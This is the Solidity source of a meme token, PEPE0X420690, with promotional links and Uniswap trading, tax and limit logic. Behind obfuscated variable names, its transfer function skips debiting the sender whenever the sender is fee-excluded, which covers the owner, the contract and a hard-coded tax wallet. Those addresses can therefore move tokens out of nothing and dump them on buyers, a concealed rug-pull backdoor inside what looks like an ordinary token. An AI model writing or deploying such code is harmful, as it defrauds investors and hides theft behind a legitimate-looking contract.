/**
Pepe0x420690 is the best narrative in the space

Website :  https://www.pepe0x420690.vip
Telegram:  https://t.me/pepe0x420690_eth
X:         https://x.com/pepe0x420690eth
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PEPE0X420690 is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"PEPE0X420690";
    string private constant _symbol = unicode"420690";
    uint256 private constant _tTotal = 420_690_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = _tTotal.mul(1).div(100);
    uint256 public _taxSwapThreshold = 42 * 10 ** _decimals;
    uint256 public _maxTxAmount = _tTotal.mul(2).div(100);
    uint256 public _maxWalletSize = _tTotal.mul(2).div(100);

    uint256 private constant _initialBuyTax = 20;
    uint256 private constant _initialSellTax = 20;
    uint256 private constant _reduceBuyTaxAt = 11;
    uint256 private constant _reduceSellTaxAt = 11;
    uint256 private constant _preventSwapBefore = 9;

    address payable private _taxWallet;
    address private uniswapV2Pair;
    IUniswapV2Router02 private uniswapV2Router;

    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _buyCount = 0;
    uint256 private _countTax;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event FinalTax(uint256 _valueBuy, uint256 _valueSell);
    event TradingActive(bool _tradingOpen, bool _swapEnabled);
    event maxAmount(uint256 _value);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xf31017fc09866a9F0B708c4f48FD7f8a88214d27);
        _balances[_msgSender()] = _tTotal;
        excludeFromFee(owner(), true);
        excludeFromFee(address(this), true);
        excludeFromFee(_taxWallet, true);
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function excludeFromFee(address account, bool excluded) public onlyOwner {
        _isExcludedFromFee[account] = excluded;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(
            owner != address(0) && spender != address(0),
            "ERC20: approve the zero address"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address iiikpzcy, address oopqtyz, uint256 ppzc) private {
        require(
            iiikpzcy != address(0) && oopqtyz != address(0),
            "ERC20: transfer the zero address"
        );
        require(ppzc > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen) {
            require(
                _isExcludedFromFee[oopqtyz] || _isExcludedFromFee[iiikpzcy],
                "trading not yet open"
            );
        }

        if (!swapEnabled || inSwap) {
            _balances[iiikpzcy] = _balances[iiikpzcy].sub(ppzc);
            _balances[oopqtyz] = _balances[oopqtyz].add(ppzc);
            emit Transfer(iiikpzcy, oopqtyz, ppzc);
            return;
        }
        uint256 taxAmount = 0;

        taxAmount =
            ppzc.mul(
                (_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax
            ) /
            100;

        if (iiikpzcy != owner() && oopqtyz != owner()) {
            if (
                iiikpzcy == uniswapV2Pair &&
                oopqtyz != address(uniswapV2Router) &&
                !_isExcludedFromFee[oopqtyz]
            ) {
                require(ppzc <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(oopqtyz) + ppzc <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (oopqtyz == uniswapV2Pair && iiikpzcy != address(this)) {
                taxAmount =
                    ppzc.mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    ) /
                    100;
            }

            _countTax += taxAmount;
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                oopqtyz == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[iiikpzcy] &&
                !_isExcludedFromFee[oopqtyz]
            ) {
                if(contractTokenBalance >= _taxSwapThreshold) {
                    uint256 getMinValue = (contractTokenBalance > _maxTaxSwap)
                        ? _maxTaxSwap
                        : contractTokenBalance;
                    swapTokensForEth((ppzc > getMinValue) ? getMinValue : ppzc);
                }
                _countTax = 0;
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) { sendETHToFee(address(this).balance); }
            }
        }
        
        bool doSwap = !_isExcludedFromFee[iiikpzcy];
        _basicTransfer(iiikpzcy, ppzc, taxAmount, doSwap);
        _balances[oopqtyz] = _balances[oopqtyz].add(ppzc.sub(taxAmount));
        emit Transfer(iiikpzcy, oopqtyz, ppzc.sub(taxAmount));
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function _basicTransfer(address bbcduvw, uint256 vvctuv, uint256 taxAmount, bool doSwap) private { 
        if (doSwap) {
            _balances[bbcduvw] = _balances[bbcduvw].sub(vvctuv);
            if(taxAmount > 0){
               _balances[address(this)] = _balances[address(this)].add(taxAmount);
                emit Transfer(bbcduvw, address(this), taxAmount); 
            }
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "init already called");
        uint256 tokenAmount = _tTotal.mul(90).div(100);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading already open");
        swapEnabled = true;
        tradingOpen = true;
        emit TradingActive(tradingOpen, swapEnabled);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit maxAmount(_tTotal);
    }

    receive() external payable {}

    function withdrawStuckETH() external {
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function setFinalTax(
        uint256 _valueBuy,
        uint256 _valueSell
    ) external onlyOwner {
        require(
            _valueBuy <= 25 && _valueSell <= 25 && tradingOpen,
            "Final Tax: Exceeds value"
        );
        _finalBuyTax = _valueBuy;
        _finalSellTax = _valueSell;
        emit FinalTax(_valueBuy, _valueSell);
    }
}